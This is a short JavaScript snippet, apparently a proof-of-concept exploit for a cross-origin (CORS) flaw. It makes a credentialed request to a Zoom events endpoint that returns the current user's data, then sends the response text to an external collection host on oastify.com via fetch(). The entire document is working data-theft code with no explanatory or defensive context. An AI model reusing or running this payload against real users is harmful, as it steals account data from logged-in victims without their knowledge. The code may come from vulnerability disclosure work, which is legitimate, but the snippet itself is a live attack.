var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    fetch(('https://onfb5ongcasd9gick75i64dpigo9c10q.oastify.com/?xxx='+this.responseText))
};
